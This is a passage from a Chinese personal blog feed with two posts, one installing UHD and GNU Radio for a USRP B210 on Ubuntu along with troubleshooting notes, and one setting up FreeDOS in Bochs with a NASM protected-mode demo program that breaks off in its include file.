class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.7.4/Python-3.7.4rc2.tgz</span><br><span class="line">tar zxvf Python-3.7.4rc2.tgz</span><br><span class="line"><span class="built_in">cd</span> Python-3.7.4rc2</span><br><span class="line">sudo apt-get install build-essential python-dev python-setuptools python-pip python-smbus libncursesw5-dev libgdbm-dev libc6-dev zlib1g-dev libsqlite3-dev tk-dev libssl-dev openssl libffi-dev<span class="comment">#安装python3依赖库</span></span><br><span class="line">./configure --with-ssl --prefix=/usr/<span class="built_in">local</span>/python3</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">sudo rm /usr/bin/python3<span class="comment">#可能/usr/local/bin下的python3也要删除</span></span><br><span class="line">sudo ln -s /usr/<span class="built_in">local</span>/python3/bin/python3 /usr/bin/python3</span><br></pre></td></tr></table></figure><p>2019-9-29在实体ubuntu上安装遇到了问题：gnuradio make的时候报错，make test后发现qa_uhd之后的模块全部失败，网上没有这个问题，我怀疑是我ubuntu python的问题，因为之前pip的时候就报错了，后来找到一条命令<code>ctest -V -R qa_uhd</code>可以查看报错信息，是import uhd_swig时报错了，然后无解，重装系统。还是同样的问题，这时候我陷入了迷茫，去安装成功的虚拟机看了一遍history，突然发现uhd也是可以git checkout指定版本的，我实体机都是默认安的uhd3.15.0，然后我的gnuradio并不是默认版本，而是自己改成了maint-3.7，而以前虚拟机安的uhd版本是3.14，我怀疑是版本不兼容，重新安装了uhd3.14果然就成功编译了。</p><p>在gnuradio make完后又出现了qa_zeromq_sub fail的问题，还好网上有类似问题，pip install zmq后成功解决。</p><h2 id="UHD驱动安装"><a href="#UHD驱动安装" class="headerlink" title="UHD驱动安装"></a>UHD驱动安装</h2><p>更新源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>安装UHD和GNURADIO的必要环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install git swig cmake doxygen build-essential libboost-all-dev libtool libusb-1.0-0 libusb-1.0-0-dev libudev-dev libncurses5-dev libfftw3-bin libfftw3-dev libfftw3-doc libcppunit-1.13-0v5 libcppunit-dev libcppunit-doc ncurses-bin cpufrequtils python-numpy python-numpy-doc python-numpy-dbg python-scipy python-docutils qt4-bin-dbg qt4-default qt4-doc libqt4-dev libqt4-dev-bin python-qt4 python-qt4-dbg python-qt4-dev python-qt4-doc python-qt4-doc libqwt6abi1 libfftw3-bin libfftw3-dev libfftw3-doc ncurses-bin libncurses5 libncurses5-dev libncurses5-dbg libfontconfig1-dev libxrender-dev libpulse-dev swig g++ automake autoconf libtool python-dev libfftw3-dev libcppunit-dev libboost-all-dev libusb-dev libusb-1.0-0-dev fort77 libsdl1.2-dev python-wxgtk3.0 git-core libqt4-dev python-numpy ccache python-opengl libgsl-dev python-cheetah python-mako python-lxml doxygen qt4-default qt4-dev-tools libusb-1.0-0-dev libqwt5-qt4-dev libqwtplot3d-qt4-dev pyqt4-dev-tools python-qwt5-qt4 cmake git-core wget libxi-dev gtk2-engines-pixbuf r-base-dev python-tk liborc-0.4-0 liborc-0.4-dev libasound2-dev python-gtk2 libzmq-dev libzmq1 python-requests python-sphinx libcomedi-dev python-zmq python-setuptools</span><br></pre></td></tr></table></figure><p>到这一步都顺利安装，接着便是安装UHD</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$HOME</span></span><br><span class="line">mkdir workarea-uhd</span><br><span class="line"><span class="built_in">cd</span> workarea-uhd</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/EttusResearch/uhd <span class="comment">#这里尝试了代理，但是速度依旧只有几K，而且中途容易下载失败，多次失败后发现是公司网络的问题</span></span><br><span class="line"><span class="built_in">cd</span> uhd</span><br><span class="line"><span class="built_in">cd</span> host</span><br><span class="line">mkdir build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake ../</span><br><span class="line">make <span class="comment">#这一步大概耗时一个多小时，最后98%的时候因为虚拟机内存过小失败了，把内存从1G调整成2G后就成功make了</span></span><br><span class="line">make <span class="built_in">test</span></span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p><img src="/images/usrpb210%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.png" alt="avatar"><br>至此UHD安装完成</p><p>下面是官网原始过程，包括了各种查错步骤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir workarea-uhd</span><br><span class="line">cd workarea-uhd</span><br><span class="line">git clone https://github.com/EttusResearch/uhd</span><br><span class="line">cd uhd</span><br></pre></td></tr></table></figure><p>Next, checkout the desired UHD version. You can get a full listing of tagged releases by running the command:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag -l</span><br></pre></td></tr></table></figure><p>Example truncated output of git tag -l:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git tag -l</span><br><span class="line">...</span><br><span class="line">release_003_009_004</span><br><span class="line">release_003_009_005</span><br><span class="line">release_003_010_000_000</span><br></pre></td></tr></table></figure><p>Note: As of UHD Version 3.10.0.0, the versioning scheme has changed to be a quadruplet format. Each element and version will follow the format of: Major.API.ABI.Patch. Additional details on this versioning change can be found here.</p><p>After identifying the version and corresponding release tag you need, check it out:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Example: For UHD 3.9.5:</span><br><span class="line">git checkout release_003_009_005</span><br><span class="line"># Example: For UHD 3.14.0.0</span><br><span class="line">git checkout v3.14.0.0</span><br></pre></td></tr></table></figure><p>Next, create a build folder within the repository.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd host</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br></pre></td></tr></table></figure><p>Next, invoke CMake to create the Makefiles.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake ../</span><br></pre></td></tr></table></figure><p>Next, run Make to build UHD.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><p>Next, you can optionally run some basic tests to verify that the build process completed properly.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make test</span><br></pre></td></tr></table></figure><p>Next, install UHD, using the default install prefix, which will install UHD under the /usr/local/lib folder. You need to run this as root due to the permissions on that folder.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>Next, update the system’s shared library cache.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p>Finally, make sure that the LD_LIBRARY_PATH environment variable is defined and includes the folder under which UHD was installed. Most commonly, you can add the line below to the end of your $HOME/.bashrc file:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=/usr/local/lib</span><br></pre></td></tr></table></figure><p>If the LD_LIBRARY_PATH environment variable is already defined with other folders in your $HOME/.bashrc file, then add the line below to the end of your $HOME/.bashrc file to preserve the current settings.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/lib</span><br></pre></td></tr></table></figure><p>For this change to take effect, you will need to close the current terminal window, and open a new terminal.</p><p>At this point, UHD should be installed and ready to use. You can quickly test this, with no USRP device attached, by running uhd_find_devices. You should see something similar to the following.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux; GNU C++ version 4.8.4; Boost_105400; UHD_003.010.000.HEAD-0-g6e1ac3fc</span><br><span class="line"></span><br><span class="line">No UHD Devices Found</span><br></pre></td></tr></table></figure><h2 id="下载FPGA-images"><a href="#下载FPGA-images" class="headerlink" title="下载FPGA images"></a>下载FPGA images</h2><p>然后是下载FPGA images，设备运行的时候需要加载，我一开始没有下载就报错了<br>直接<code>sudo uhd_images_downloader</code>就行了</p><p>下面是官网的下载及查错步骤：<br>Downloading the UHD FPGA Images<br>You can now download the UHD FPGA Images for this installation. This can be done by running the command uhd_images_downloader.</p><p>   $ sudo uhd_images_downloader<br>Note: Since this installation is being installed to a system level directory (e.g. /usr/local), the uhd_images_downloader command requires sudo privileges.</p><p>Example ouput for UHD 3.13.3.0:</p><p>$ sudo uhd_images_downloader<br>Images destination:      /usr/local/share/uhd/images<br>Downloading images from: <a href="http://files.ettus.com/binaries/images/uhd-images_003.010.003.000-release.zip" target="_blank" rel="noopener">http://files.ettus.com/binaries/images/uhd-images_003.010.003.000-release.zip</a><br>Downloading images to:   /tmp/tmpm46JDg/uhd-images_003.010.003.000-release.zip<br>57009 kB / 57009 kB (100%)</p><p>Images successfully installed to: /usr/local/share/uhd/images<br>Example output for UHD 3.13:</p><p>$ sudo uhd_images_downloader<br>[INFO] Images destination: /usr/local/share/uhd/images<br>[INFO] No inventory file found at /usr/local/share/uhd/images/inventory.json. Creating an empty one.<br>00006 kB / 00006 kB (100%) usrp1_b100_fw_default-g6bea23d.zip<br>19484 kB / 19484 kB (100%) x3xx_x310_fpga_default-g494ae8bb.zip<br>02757 kB / 02757 kB (100%) usrp2_n210_fpga_default-g6bea23d.zip<br>02109 kB / 02109 kB (100%) n230_n230_fpga_default-g494ae8bb.zip<br>00522 kB / 00522 kB (100%) usrp1_b100_fpga_default-g6bea23d.zip<br>00474 kB / 00474 kB (100%) b2xx_b200_fpga_default-g494ae8bb.zip<br>02415 kB / 02415 kB (100%) usrp2_n200_fpga_default-g6bea23d.zip<br>05920 kB / 05920 kB (100%) e3xx_e320_fpga_default-g494ae8bb.zip<br>15883 kB / 15883 kB (100%) n3xx_n310_fpga_default-g494ae8bb.zip<br>00506 kB / 00506 kB (100%) b2xx_b205mini_fpga_default-g494ae8bb.zip<br>18676 kB / 18676 kB (100%) x3xx_x300_fpga_default-g494ae8bb.zip<br>00017 kB / 00017 kB (100%) octoclock_octoclock_fw_default-g14000041.zip<br>04839 kB / 04839 kB (100%) usb_common_windrv_default-g14000041.zip<br>00007 kB / 00007 kB (100%) usrp2_usrp2_fw_default-g6bea23d.zip<br>00009 kB / 00009 kB (100%) usrp2_n200_fw_default-g6bea23d.zip<br>00450 kB / 00450 kB (100%) usrp2_usrp2_fpga_default-g6bea23d.zip<br>00142 kB / 00142 kB (100%) b2xx_common_fw_default-g3ff4186b.zip<br>00460 kB / 00460 kB (100%) b2xx_b200mini_fpga_default-g494ae8bb.zip<br>00319 kB / 00319 kB (100%) usrp1_usrp1_fpga_default-g6bea23d.zip<br>00009 kB / 00009 kB (100%) usrp2_n210_fw_default-g6bea23d.zip<br>11537 kB / 11537 kB (100%) n3xx_n300_fpga_default-g494ae8bb.zip<br>05349 kB / 05349 kB (100%) e3xx_e310_fpga_default-g494ae8bb.zip<br>00866 kB / 00866 kB (100%) b2xx_b210_fpga_default-g494ae8bb.zip<br>[INFO] Images download complete.</p><h2 id="安装GNURadio"><a href="#安装GNURadio" class="headerlink" title="安装GNURadio"></a>安装GNURadio</h2><p>接下来就是安装GNU</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir workarea-gnuradio</span><br><span class="line">cd workarea-gnuradio</span><br><span class="line">git clone --recursive https://github.com/gnuradio/gnuradio</span><br><span class="line">cd gnuradio</span><br><span class="line">git checkout v3.7.13.4</span><br><span class="line">git checkout maint-3.7</span><br><span class="line">git submodule update --init --recursive</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ../</span><br><span class="line">make</span><br><span class="line">make test</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p>启动GNURadio命令：<code>gnuradio-companion</code></p><p>下面是官网的安装及查错步骤：<br>First, make a folder to hold the repository.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir workarea-gnuradio</span><br><span class="line">cd workarea-gnuradio</span><br></pre></td></tr></table></figure><p>Next, clone the repository.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone --recursive https://github.com/gnuradio/gnuradio</span><br></pre></td></tr></table></figure><p>Next, go into the repository and check out the desired GNU Radio version.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd gnuradio</span><br></pre></td></tr></table></figure><p>To checkout the v3.7.13.4 branch:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout v3.7.13.4</span><br></pre></td></tr></table></figure><p>Or to checkout the maint-3.7 branch:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout maint-3.7</span><br></pre></td></tr></table></figure><p>Next, update the submodules:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git submodule update --init --recursive;这里出现了Submodule path &apos;volk&apos;: checked out，不知道什么原因，但似乎不影响之后的步骤</span><br></pre></td></tr></table></figure><p>Next, create a build folder within the repository.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd build</span><br></pre></td></tr></table></figure><p>Next, invoke CMake to create the Makefiles.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake ../</span><br></pre></td></tr></table></figure><p>Next, run Make to build GNU Radio.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><p>Next, you can optionally run some basic tests to verify that the build process completed properly.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make test</span><br></pre></td></tr></table></figure><p>Next, install GNU Radio, using the default install prefix, which will install GNU Radio under the /usr/local/lib folder. You need to run this as root due to the permissions on that folder.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>Finally, update the system’s shared library cache.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p>At this point, GNU Radio should be installed and ready to use. You can quickly test this, with no USRP device attached, by running the following quick tests.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gnuradio-config-info --version</span><br><span class="line">gnuradio-config-info --prefix</span><br><span class="line">gnuradio-config-info --enabled-components</span><br></pre></td></tr></table></figure><p>There is a simple flowgraph that you can run that does not require any USRP hardware. It’s called the dialtone test, and it produces a PSTN dial tone on the computer’s speakers. Running it verifies that all the libraries can be found, and that the GNU Radio run-time is working.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python $HOME/workarea-gnuradio/gnuradio/gr-audio/examples/python/dial_tone.py</span><br></pre></td></tr></table></figure><p>You can try launching the GNU Radio Companion (GRC) tool, a visual tool for building and running GNU Radio flowgraphs.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnuradio-companion</span><br></pre></td></tr></table></figure><p>If “gnuradio-companion” does not start and complains about the PYTHONPATH environment variable, then you may have to set this in your $HOME/.bashrc file, as shown below.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PYTHONPATH=/usr/local/lib/python2.7/dist-packages</span><br></pre></td></tr></table></figure><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>UHD和GNU安装好后，插入设备，尝试运行uhd_find_devices，出现了“USB device 2500:0020 无法连接到理想的主机控制器”的报错，我原本以为是设备出了问题，因为官网上似乎说b210的信号是2500:0021，镜像加载也是加载了b200，谷歌了之后发现这是因为usb兼容性的问题，在虚拟机设置的USB控制器里把usb兼容性改为usb3.0后解决了问题</p><p>运行正常<br><img src="/images/2019-7-4-usrpb210%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.png" alt="avatar"><br><img src="/images/2019-7-4-usrpb210%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/4.png" alt="avatar"><br>最后这里有一点搞不懂<br>uhd_find_devices和uhd_usrp_probe两个命令加载的FPGA images不一样，前者是b200，后者是b210，不过都正确识别出了b210的设备，目前对这个问题没有头绪。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-5-29-自己动手写操作系统(3)</title>
      <link href="/passages/2019-5-29-%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(3)/"/>
      <url>/passages/2019-5-29-%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(3)/</url>
      
        <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>一边自己写简易的操作系统，一边阅读《程序员的自我修养》了解操作系统，越发地体会到操作系统的复杂。今天为了之后实验更方便地进行调试，还需要安装一个X86的dos。</p><h1 id="第一步：配置freedos"><a href="#第一步：配置freedos" class="headerlink" title="第一步：配置freedos"></a>第一步：配置freedos</h1><h2 id="1、下载freedos"><a href="#1、下载freedos" class="headerlink" title="1、下载freedos"></a>1、下载freedos</h2><p>在<a href="http://bochs.sourceforge.net/guestos/freedos-img.tar.gz上面下载FreeDos" target="_blank" rel="noopener">http://bochs.sourceforge.net/guestos/freedos-img.tar.gz上面下载FreeDos</a></p><h2 id="2、创建镜像"><a href="#2、创建镜像" class="headerlink" title="2、创建镜像"></a>2、创建镜像</h2><p>bochs可以通过bximage命令快捷地创建镜像<br><img src="/images/minisystem/2019-5-29-section3-1.png" alt="avatar"><br>其中红框部分就是要需要输入的，分别是选择功能、选择创建硬盘(hd)还是软盘(fd)镜像、设置软盘镜像大小、命名(pm.img)。<br>随后将下载好的freedos解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar vxzf freedos-img.tar.gz</span><br></pre></td></tr></table></figure><p>将解压得到的a.img改名成freedos.img，和上一步创建的pm.img放在同一个工作目录下<br>之后可以将freedos解压文件中的bochsrc直接复制到该文件，然后修改部分配置选项<br><img src="/images/minisystem/2019-5-29-section3-2.png" alt="avatar"><br>接着启动bochs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bochs  -f  bochsrc</span><br></pre></td></tr></table></figure><p>启动后格式化b盘，然后退出bochs<br><img src="/images/minisystem/2019-5-29-section3-3.png" alt="avatar"></p><h1 id="第二步：编译pmtest1-asm"><a href="#第二步：编译pmtest1-asm" class="headerlink" title="第二步：编译pmtest1.asm"></a>第二步：编译pmtest1.asm</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">;=========================================</span><br><span class="line">;pmtest1.asm</span><br><span class="line">;编译方法: nasm pmtest1.asm -o pmtest1.com</span><br><span class="line">;=========================================</span><br><span class="line">%include &quot;pm.inc&quot;;常量、宏，以及一些说明</span><br><span class="line">org 0100h</span><br><span class="line">jmp LABEL_BEGIN</span><br><span class="line"></span><br><span class="line">[SECTION .gdt]</span><br><span class="line">; GDT</span><br><span class="line">LABEL_GDT:Descriptor 0, 0, 0;空描述符</span><br><span class="line">LABEL_DESC_CODE32:Descriptor 0, SegCode32Len - 1, DA_C + DA_32</span><br><span class="line">;代码段，32位</span><br><span class="line">LABEL_DESC_VIDEO:Descriptor 0B8000h, 0ffffh, DA_DRW</span><br><span class="line">;显存首地址</span><br><span class="line">;GDT结束</span><br><span class="line"></span><br><span class="line">GdtLenequ $ - LABEL_GDT;GDT长度</span><br><span class="line">GdtPtrdw  GdtLen;GDT界限</span><br><span class="line">dd  0;GDT基地址</span><br><span class="line"></span><br><span class="line">;GDT选择子</span><br><span class="line">SelectorCode32equ LABEL_DESC_CODE32 - LABEL_GDT</span><br><span class="line">SelectorVideoequ LABEL_DESC_VIDEO  - LABEL_GDT</span><br><span class="line">;END of [SECTION .gdt]</span><br><span class="line">[SECTION .s16] </span><br><span class="line">[BITS 16]</span><br><span class="line">LABEL_BEGIN:</span><br><span class="line">mov ax, cs</span><br><span class="line">mov ds, ax</span><br><span class="line">mov es, ax </span><br><span class="line">mov ss, ax</span><br><span class="line">mov sp, 0100h</span><br><span class="line"></span><br><span class="line">;初始化32位代码段描述符</span><br><span class="line">xor eax, eax</span><br><span class="line">mov ax,  cs</span><br><span class="line">shl eax, 4</span><br><span class="line">add eax, LABEL_SEG_CODE32</span><br><span class="line">mov word [LABEL_DESC_CODE32 + 2], ax</span><br><span class="line">shr eax, 16</span><br><span class="line">mov byte [LABEL_DESC_CODE32 + 4], al</span><br><span class="line">mov byte [LABEL_DESC_CODE32 + 7], ah</span><br><span class="line"></span><br><span class="line">;为加载gdtr做准备</span><br><span class="line">xor eax, eax</span><br><span class="line">mov ax,  ds</span><br><span class="line">shl eax, 4</span><br><span class="line">add eax, LABEL_GDT</span><br><span class="line">mov dword [GdtPtr + 2], eax</span><br><span class="line"></span><br><span class="line">;加载gdtr</span><br><span class="line">lgdt [GdtPtr]</span><br><span class="line"></span><br><span class="line">;关中断</span><br><span class="line">cli</span><br><span class="line"></span><br><span class="line">;打开地址线A20</span><br><span class="line">in  al, 92h</span><br><span class="line">or  al, 00000010b</span><br><span class="line">out 92h, al</span><br><span class="line"></span><br><span class="line">;准备切换到保护模式</span><br><span class="line">mov eax, cr0</span><br><span class="line">or  eax, 1</span><br><span class="line">mov cr0, eax</span><br><span class="line"></span><br><span class="line">;真正进入保护方式</span><br><span class="line">jmp dword SelectorCode32:0;执行这一句会把SelectorCode32装入cs,并跳转到SelectorCode32:0处</span><br><span class="line"></span><br><span class="line">[SECTION .32]; 32位代码段,由实模式跳入</span><br><span class="line">[BITS 32]</span><br><span class="line"></span><br><span class="line">LABEL_SEG_CODE32:</span><br><span class="line">mov ax, SelectorVideo</span><br><span class="line">mov gs, ax;视频段选择子(目的)</span><br><span class="line">mov edi, (80 * 10 + 0) * 2;屏幕第10行,第0列</span><br><span class="line">mov ah, 0ch;0000:黑底1100:红字</span><br><span class="line">mov al, &apos;P&apos;</span><br><span class="line">mov [gs:edi], ax</span><br><span class="line"></span><br><span class="line">;到此为止</span><br><span class="line"></span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line">SegCode32Lenequ $ - LABEL_SEG_CODE32</span><br><span class="line">;END of [SECTION .s32]</span><br></pre></td></tr></table></figure><p>另外还要准备pm.inc(代码来源<a href="https://blog.csdn.net/jltxgcy/article/details/8656101" target="_blank" rel="noopener">https://blog.csdn.net/jltxgcy/article/details/8656101</a>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">;----------------------------------------------------------------------------</span><br><span class="line">; 描述符类型值说明</span><br><span class="line">; 其中:</span><br><span class="line">;       DA_  : Descriptor Attribute</span><br><span class="line">;       D    : 数据段</span><br><span class="line">;       C    : 代码段</span><br><span class="line">;       S    : 系统段</span><br><span class="line">;       R    : 只读</span><br><span class="line">;       RW   : 读写</span><br><span class="line">;       A    : 已访问</span><br><span class="line">;       其它 : 可按照字面意思理解</span><br><span class="line">;G D 0 AVL 0 0 0 0 P DPL(2位) DT TYPE(4位)</span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line">DA_32EQU4000h; 32 位段 0100 0000 0000 0000</span><br><span 